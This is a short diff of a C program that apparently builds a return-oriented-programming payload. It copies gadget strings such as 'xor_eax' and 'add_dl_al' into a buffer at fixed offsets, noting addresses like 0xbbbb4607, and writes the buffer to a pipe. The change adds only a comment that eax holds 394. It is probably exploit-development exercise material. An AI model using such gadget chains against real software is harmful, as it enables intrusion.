@@ -32,6 +32,8 @@ int main(void)
   strcpy(bufr + 147, xor_eax);
   strcpy(bufr + 151, add_dl_al); // 0xbbbb4607
   strcpy(bufr + 155, add_cl_ah); // 0xbba7bdd7
+                                 // eax now holds 394
+  
   writecmd(PIPEPATH, bufr);
   
   return 0;
